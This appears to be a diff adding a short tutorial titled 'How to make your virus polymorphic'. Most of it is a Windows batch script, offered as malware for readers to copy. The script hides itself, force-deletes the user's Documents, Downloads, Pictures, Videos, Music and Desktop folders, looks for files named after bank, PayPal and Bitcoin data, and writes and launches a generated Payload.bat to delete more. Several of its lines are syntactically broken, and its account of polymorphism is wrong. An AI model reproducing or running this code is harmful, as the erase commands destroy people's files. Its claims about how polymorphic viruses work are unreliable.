@@ -1,0 +1,52 @@
+How to make your virus polymorphic:
+
+:: First your virus must be able to adapt beyond its intentional purpose.
+:: Here is a sample of what a virus would do without adapting yet.
+
+@echo off & Title Worm:Win32/Polymorphic.A
+color 0a & cls & Attrib %0 +H +R & @BREAK
+ERASE /F /Q /S C:\Users\%username%\Documents
+ERASE /F /Q /S C:\Users\%username%\Downloads
+ERASE /F /Q /S C:\Users\%username%\Pictures
+ERASE /F /Q /S C:\Users\%username%\Videos
+ERASE /F /Q /S C:\Users\%username%\Music
+ERASE /F /Q /S C:\Users\%username%\Desktop\*.*
+If Exist C:\Users\%username%\Desktop\Bank_Account_Info del C:\Users\%username%\Desktop\Bank_Account_Info
+If Exist C:\Users\%username%\Desktop\PayPal_Information del C:\Users\%username%\Desktop\PayPal_Information
+If Exist C:\Users\%username%\Desktop\My_Bitcoins del C:\Users\%username%\Desktop\My_Bitcoins
+If Exist C:\Users\%username%\Desktop\Bank_Account_Info Goto Propagate
+If Exist C:\Users\%username%\Desktop\PayPal_Information Goto Propagate
+If Exist C:\Users\%username%\Desktop\My_Bitcoins Goto Propagate
+
+:: As you can see the viruses intent was to delete everything in Windows Explorer. but was using
+:: "If" statements to search and see if there were any 3rd party files of importance for it to 
+:: delete also. If there was then it will goto a loop where it can modify itself and create a more
+:: destructive payload to delete information.
+
+If Exist C:\Users\%username%\Desktop\Bank_Account_Info del C:\Users\%username%\Desktop\Bank_Account_Info
+If Exist C:\Users\%username%\Desktop\PayPal_Information del C:\Users\%username%\Desktop\PayPal_Information
+If Exist C:\Users\%username%\Desktop\My_Bitcoins del C:\Users\%username%\Desktop\My_Bitcoins
+If Exist C:\Users\%username%\Desktop\Bank_Account_Info Goto Propagate
+If Exist C:\Users\%username%\Desktop\PayPal_Information Goto Propagate
+If Exist C:\Users\%username%\Desktop\My_Bitcoins Goto Propagate
+:Propagate
+@echo Set/ C:\Users\%username%\Desktop\My_Bitcoins = 1Target >>Payload.bat
+@echo Set/ C:\Users\%username%\Desktop\PayPal_Information = 2Target >>Payload.bat
+@echo Set/ C:\Users\%username%\Desktop\Bank_Account_Info = 3Target >>Payload.bat
+@echo Attrib %1Target% -r -s -h & Del /F /Q /S %1target% >>Payload.bat
+@echo Attrib %2Target% -r -s -h & Del /F /Q /S %2target% >>Payload.bat
+@echo Attrib %3Target% -r -s -h & Del /F /Q /S %3target% >>Payload.bat
+Start Payload.bat & @exit
+
+:: Now you can see that since it came acrossed other files of importance it had a loop
+:: in its code prepared so if it did come in contact with those types of 3rd party files
+:: it would create and run a program called "PayLoad.bat" which would delete the files that
+:: it wasnt coded to do (So it would waste time searching randomly)
+
+This is a vague brief example of a polymorphic virus and all
+the filenames in this code above can be changed.
+
+
+
+
+
